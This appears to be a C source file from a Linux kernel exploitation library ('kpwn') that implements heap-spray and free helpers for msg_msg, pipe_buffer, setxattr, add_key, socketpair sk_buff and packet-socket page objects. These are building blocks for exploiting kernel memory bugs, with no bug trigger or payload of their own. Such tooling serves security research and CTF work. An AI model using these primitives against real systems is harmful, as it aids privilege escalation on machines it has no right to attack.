#define _GNU_SOURCE

#include <kpwn/logger.h>
#include <kpwn/spray.h>
#include <kpwn/utils.h>

#include <arpa/inet.h>
#include <errno.h>
#include <fcntl.h>
#include <linux/if_packet.h>
#include <linux/keyctl.h>
#include <net/ethernet.h>
#include <stdint.h>
#include <string.h>
#include <sys/ipc.h>
#include <sys/mman.h>
#include <sys/msg.h>
#include <sys/socket.h>
#include <sys/syscall.h>
#include <sys/un.h>
#include <sys/xattr.h>
#include <unistd.h>

// --- msg_msg -----------------------------------------------------------------

struct kpwn_msgbuf {
  long mtype;
  char mtext[];
};

int kpwn_spray_msg(int *qids, size_t n, const void *data, size_t data_len) {
  size_t msg_size = data_len;

  for (size_t i = 0; i < n; i++) {
    qids[i] = SYSCHK(msgget(IPC_PRIVATE, 0666 | IPC_CREAT));

    struct kpwn_msgbuf *msg = malloc(sizeof(long) + msg_size);
    ASSERT(msg != NULL);
    msg->mtype = 1;
    if (data && data_len > 0)
      memcpy(msg->mtext, data, data_len);

    SYSCHK(msgsnd(qids[i], msg, msg_size, 0));
    free(msg);
  }

  log_debug("[kpwn:spray] msg_msg n=%zu data_len=%zu", n, data_len);
  return 0;
}

int kpwn_free_msg(int *qids, size_t n) {
  for (size_t i = 0; i < n; i++) {
    struct kpwn_msgbuf tmp = {0};
    msgrcv(qids[i], &tmp, 0, 0, IPC_NOWAIT | MSG_NOERROR);
    SYSCHK(msgctl(qids[i], IPC_RMID, NULL));
  }
  log_debug("[kpwn:spray] freed %zu msg queues", n);
  return 0;
}

int kpwn_read_msg(int qid, void *buf, size_t buf_len) {
  struct kpwn_msgbuf *msg = malloc(sizeof(long) + buf_len);
  ASSERT(msg != NULL);
  ssize_t ret = msgrcv(qid, msg, buf_len, 0, IPC_NOWAIT | MSG_NOERROR);
  if (ret >= 0 && buf)
    memcpy(buf, msg->mtext, (size_t)ret);
  free(msg);
  return (int)ret;
}

// --- pipe_buffer -------------------------------------------------------------

int kpwn_spray_pipe(struct kpwn_pipe *pipes, size_t n) {
  for (size_t i = 0; i < n; i++)
    SYSCHK(pipe(pipes[i].fd));
  log_debug("[kpwn:spray] pipes n=%zu", n);
  return 0;
}

int kpwn_write_pipe(struct kpwn_pipe *pipes, size_t n, const void *data,
                    size_t data_len) {
  for (size_t i = 0; i < n; i++)
    SYSCHK(write(pipes[i].fd[1], data, data_len));
  return 0;
}

int kpwn_free_pipe(struct kpwn_pipe *pipes, size_t n) {
  for (size_t i = 0; i < n; i++) {
    close(pipes[i].fd[0]);
    close(pipes[i].fd[1]);
  }
  log_debug("[kpwn:spray] freed %zu pipes", n);
  return 0;
}

// --- setxattr ----------------------------------------------------------------

int kpwn_spray_xattr(const char *path, size_t n, const void *data,
                     size_t data_len) {
  for (size_t i = 0; i < n; i++) {
    char name[64];
    snprintf(name, sizeof(name), "user.kpwn%zu", i);
    setxattr(path, name, data, data_len, 0);
  }
  log_debug("[kpwn:spray] xattr n=%zu data_len=%zu path=%s", n, data_len, path);
  return 0;
}

// --- add_key (user_key_payload) ----------------------------------------------

int kpwn_spray_key(int *keyids, size_t n, const void *data, size_t data_len) {
  for (size_t i = 0; i < n; i++) {
    char desc[64];
    snprintf(desc, sizeof(desc), "kpwn%zu", i);
    int kid = (int)syscall(__NR_add_key, "user", desc, data, data_len,
                           KEY_SPEC_PROCESS_KEYRING);
    if (kid < 0) {
      log_error("[kpwn:spray] add_key failed at %zu: %s", i, strerror(errno));
      return -1;
    }
    keyids[i] = kid;
  }
  log_debug("[kpwn:spray] keys n=%zu data_len=%zu", n, data_len);
  return 0;
}

int kpwn_free_key(int *keyids, size_t n) {
  for (size_t i = 0; i < n; i++)
    syscall(__NR_keyctl, KEYCTL_REVOKE, keyids[i]);
  log_debug("[kpwn:spray] revoked %zu keys", n);
  return 0;
}

// --- sk_buff (socketpair) ----------------------------------------------------

int kpwn_spray_skb(struct kpwn_skb_pair *pairs, size_t n_pairs,
                   size_t msgs_per_pair, const void *data, size_t data_len) {
  for (size_t i = 0; i < n_pairs; i++) {
    SYSCHK(socketpair(AF_UNIX, SOCK_DGRAM, 0, pairs[i].fd));
    for (size_t j = 0; j < msgs_per_pair; j++)
      SYSCHK(send(pairs[i].fd[0], data, data_len, 0));
  }
  log_debug("[kpwn:spray] skb pairs=%zu msgs_per=%zu data_len=%zu", n_pairs,
            msgs_per_pair, data_len);
  return 0;
}

int kpwn_free_skb(struct kpwn_skb_pair *pairs, size_t n_pairs) {
  for (size_t i = 0; i < n_pairs; i++) {
    close(pairs[i].fd[0]);
    close(pairs[i].fd[1]);
  }
  log_debug("[kpwn:spray] freed %zu skb pairs", n_pairs);
  return 0;
}

// --- pgv (packet socket page spray) ------------------------------------------

int kpwn_spray_pgv(int *fds, size_t n, unsigned int block_size,
                   unsigned int block_nr, unsigned int frame_size) {
  for (size_t i = 0; i < n; i++) {
    fds[i] = SYSCHK(socket(AF_PACKET, SOCK_DGRAM, htons(ETH_P_ALL)));

    int ver = TPACKET_V2;
    SYSCHK(setsockopt(fds[i], SOL_PACKET, PACKET_VERSION, &ver, sizeof(ver)));

    struct tpacket_req req = {
        .tp_block_size = block_size,
        .tp_block_nr = block_nr,
        .tp_frame_size = frame_size,
        .tp_frame_nr = (block_size / frame_size) * block_nr,
    };

    SYSCHK(setsockopt(fds[i], SOL_PACKET, PACKET_TX_RING, &req, sizeof(req)));
  }
  log_debug("[kpwn:spray] pgv n=%zu blk_size=%u blk_nr=%u", n, block_size,
            block_nr);
  return 0;
}

int kpwn_free_pgv(int *fds, size_t n) {
  for (size_t i = 0; i < n; i++)
    close(fds[i]);
  log_debug("[kpwn:spray] freed %zu pgv sockets", n);
  return 0;
}
